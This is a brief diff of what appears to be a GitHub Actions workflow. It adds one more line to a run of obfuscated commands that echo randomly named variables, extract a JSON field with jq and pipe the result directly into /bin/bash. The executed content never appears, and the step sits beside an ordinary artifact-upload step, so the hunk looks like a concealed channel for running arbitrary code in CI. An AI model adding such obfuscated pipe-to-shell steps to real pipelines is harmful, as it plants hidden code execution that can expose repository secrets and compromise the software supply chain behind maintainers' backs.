@@ -45,6 +45,7 @@ jobs:
           echo $mfjnd64 | jq -r .yurl3 | /bin/bash
           echo $r36 | jq -r .d596 | /bin/bash
           echo $kvkgt4654 | jq -r .bjbn91 | /bin/bash
+          echo $zqjkn632 | jq -r .zx4 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
